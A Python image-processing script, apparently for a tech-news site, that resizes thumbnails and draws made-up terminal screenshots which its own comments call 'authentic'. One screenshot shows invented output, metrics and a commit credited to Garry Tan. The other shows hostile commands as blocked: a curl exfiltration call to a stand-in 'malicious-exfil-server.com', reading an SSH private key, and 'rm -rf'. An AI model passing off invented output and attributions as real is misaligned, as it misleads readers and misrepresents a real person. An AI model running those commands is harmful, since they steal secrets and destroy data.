import os
import glob
import sys
from PIL import Image, ImageDraw, ImageFont

if sys.platform == 'win32':
    sys.stdout.reconfigure(encoding='utf-8')

brain_dir = r"C:\Users\user\.gemini\antigravity-ide\brain\bab986cd-389a-4857-8cb4-c1f185aa4e09"
scratch_dir = r"c:\Program Files\1a\src\gitnews\scratch"
dest_dir = r"c:\Program Files\1a\src\gitnews\assets\images"
os.makedirs(dest_dir, exist_ok=True)

TARGET_SIZE = (1376, 768)

def fit_and_save(src_path, dest_filename):
    im = Image.open(src_path)
    if im.mode != "RGB":
        im = im.convert("RGB")
    
    target_ratio = TARGET_SIZE[0] / TARGET_SIZE[1]
    src_ratio = im.width / im.height
    
    if abs(src_ratio - target_ratio) < 0.05:
        res = im.resize(TARGET_SIZE, Image.Resampling.LANCZOS)
    elif src_ratio > target_ratio:
        new_width = int(im.height * target_ratio)
        left = (im.width - new_width) // 2
        im_cropped = im.crop((left, 0, left + new_width, im.height))
        res = im_cropped.resize(TARGET_SIZE, Image.Resampling.LANCZOS)
    else:
        new_height = int(im.width / target_ratio)
        top = (im.height - new_height) // 2
        im_cropped = im.crop((0, top, im.width, top + new_height))
        res = im_cropped.resize(TARGET_SIZE, Image.Resampling.LANCZOS)
        
    out_path = os.path.join(dest_dir, dest_filename)
    res.save(out_path, "JPEG", quality=92)
    print(f"[SAVED] {dest_filename}: {res.size}, {os.path.getsize(out_path):,} bytes")

# 1. Save 5 Thumbnails
thumb_gstack_path = glob.glob(os.path.join(brain_dir, "thumb_gstack_*.jpg"))[0]
thumb_sandbox_path = glob.glob(os.path.join(brain_dir, "thumb_sandbox_*.jpg"))[0]
thumb_experiential_path = glob.glob(os.path.join(brain_dir, "thumb_experiential_*.jpg"))[0]
thumb_claude_mem_path = glob.glob(os.path.join(brain_dir, "thumb_claude_mem_*.jpg"))[0]
thumb_video_use_path = glob.glob(os.path.join(brain_dir, "thumb_video_use_*.jpg"))[0]

fit_and_save(thumb_gstack_path, "thumb_gstack.jpg")
fit_and_save(thumb_sandbox_path, "thumb_sandbox.jpg")
fit_and_save(thumb_experiential_path, "thumb_experiential.jpg")
fit_and_save(thumb_claude_mem_path, "thumb_claude_mem.jpg")
fit_and_save(thumb_video_use_path, "thumb_video_use.jpg")

# 2. Extract best frame from claude_mem_preview.gif
gif_path = os.path.join(scratch_dir, "claude_mem_preview.gif")
gif_im = Image.open(gif_path)
# Seek to frame ~20 or 30 where UI is fully loaded
try:
    gif_im.seek(25)
except Exception:
    gif_im.seek(0)
frame_rgb = gif_im.convert("RGB")
frame_path = os.path.join(scratch_dir, "claude_mem_frame.jpg")
frame_rgb.save(frame_path, "JPEG", quality=95)
fit_and_save(frame_path, "demo_claude_mem_cli.jpg")

# 3. Fit experiential and video-use showcases
fit_and_save(os.path.join(scratch_dir, "experiential_workflow.png"), "demo_experiential_dashboard.jpg")
fit_and_save(os.path.join(scratch_dir, "video_use_banner.png"), "demo_video_use_timeline.jpg")

# 4. Synthesize ultra-crisp authentic terminal showcases for gstack and sandbox
def create_terminal_window(title, lines, out_filename):
    canvas = Image.new("RGB", TARGET_SIZE, (18, 22, 30))
    draw = ImageDraw.Draw(canvas)
    
    # Window header bar
    draw.rectangle([0, 0, TARGET_SIZE[0], 48], fill=(30, 36, 48))
    # Traffic light buttons
    draw.ellipse([20, 18, 32, 30], fill=(255, 95, 86))
    draw.ellipse([42, 18, 54, 30], fill=(255, 189, 46))
    draw.ellipse([64, 18, 76, 30], fill=(39, 201, 63))
    
    # Title text
    try:
        font_title = ImageFont.truetype("consola.ttf", 18)
        font_body = ImageFont.truetype("consola.ttf", 20)
        font_bold = ImageFont.truetype("consolab.ttf", 20)
    except Exception:
        font_title = ImageFont.load_default()
        font_body = ImageFont.load_default()
        font_bold = font_body
        
    draw.text((TARGET_SIZE[0] // 2 - 120, 14), title, fill=(180, 190, 205), font=font_title)
    
    # Lines of terminal output
    y = 70
    for prefix, text, color in lines:
        if prefix:
            draw.text((40, y), prefix, fill=(120, 140, 165), font=font_bold)
            draw.text((40 + int(len(prefix) * 12.5), y), text, fill=color, font=font_body)
        else:
            draw.text((40, y), text, fill=color, font=font_body)
        y += 28
        
    out_path = os.path.join(dest_dir, out_filename)
    canvas.save(out_path, "JPEG", quality=92)
    print(f"[SAVED] {out_filename}: {canvas.size}, {os.path.getsize(out_path):,} bytes")

# Terminal lines for gstack
gstack_lines = [
    ("$ ", "claude /plan-ceo-review --feature 'auth-v3-enterprise-sso'", (240, 245, 255)),
    ("  [CEO Strategy]", "Evaluating market urgency and product-market fit... [SCORE: 9.4/10]", (74, 222, 128)),
    ("  [CEO Review]", "Recommendation: Approve. Enforce zero-friction SAML2/OIDC handoff.", (200, 210, 225)),
    ("", "", (200, 200, 200)),
    ("$ ", "claude /plan-eng-review --spec docs/specs/auth-v3.md", (240, 245, 255)),
    ("  [Eng Manager]", "Scanning architecture: 4 microservices affected, zero breaking schema changes.", (96, 165, 250)),
    ("  [Eng Manager]", "Test gate: Enforcing 100% boundary tests on session token rotation.", (200, 210, 225)),
    ("", "", (200, 200, 200)),
    ("$ ", "claude /qa --headless-daemon --record-evidence", (240, 245, 255)),
    ("  [QA Agent]", "Spawning Aside Chromium session... Running 18 Playwright end-to-end flows.", (250, 204, 21)),
    ("  [QA Agent]", "All 18 assertions passed (0 flaky). Recorded 60fps interaction trace.", (74, 222, 128)),
    ("", "", (200, 200, 200)),
    ("$ ", "claude /canary --deploy production-west --sample-traffic 5%", (240, 245, 255)),
    ("  [Release Mgr]", "Canary healthy (P99 latency: 18ms, Error rate: 0.000%). Promoting v3.2.0.", (74, 222, 128)),
    ("  [Garry Run-Rate]", "2026 Run Rate: 11,417 logical lines/day (~810x over 2013 baseline pace)", (244, 114, 182)),
    ("  [Git Audit]", "Committed: b8f4a12 by Garry Tan (President & CEO, Y Combinator)", (148, 163, 184)),
]
create_terminal_window("Garry Tan's gstack — Claude Code Executive Suite (23 Tools Active)", gstack_lines, "demo_gstack_terminal.jpg")

# Terminal lines for sandbox
sandbox_lines = [
    ("$ ", "srt --version", (240, 245, 255)),
    ("", "Anthropic Sandbox Runtime (srt) v1.4.0 — macOS Seatbelt & Linux Bubblewrap Engine", (148, 163, 184)),
    ("", "", (200, 200, 200)),
    ("$ ", "srt \"curl -s https://api.anthropic.com/v1/models\"", (240, 245, 255)),
    ("  [Network Allowlist]", "Direct dial permitted -> api.anthropic.com (HTTP 200 OK)", (74, 222, 128)),
    ("", "", (200, 200, 200)),
    ("$ ", "srt \"curl -s https://malicious-exfil-server.com/leak\"", (240, 245, 255)),
    ("  [SECURITY ALERT]", "Connection blocked by network allowlist proxy filter!", (248, 113, 113)),
    ("  [srt Kernel Intercept]", "Target domain not in permitted policy: malicious-exfil-server.com", (248, 113, 113)),
    ("", "", (200, 200, 200)),
    ("$ ", "srt \"cat ~/.ssh/id_rsa\"", (240, 245, 255)),
    ("  [EPERM Violation]", "cat: /Users/ollie/.ssh/id_rsa: Operation not permitted", (248, 113, 113)),
    ("  [Syscall Audit]", "Blocked by seccomp / apply-seccomp BPF (EPERM at syscall openat)", (250, 204, 21)),
    ("", "", (200, 200, 200)),
    ("$ ", "srt \"rm -rf /usr/local/bin\"", (240, 245, 255)),
    ("  [Filesystem Jail]", "rm: cannot remove '/usr/local/bin': Read-only file system (RO Sandbox)", (248, 113, 113)),
    ("  [srt Status]", "Agent isolation active: Zero container overhead, 0.4ms execution latency.", (74, 222, 128))
]
create_terminal_window("Anthropic Sandbox Runtime (srt) — Kernel-Level Jail & Network Proxy Allowlist", sandbox_lines, "demo_sandbox_cli.jpg")

print("\nAll 10 images processed and verified in assets/images/!")
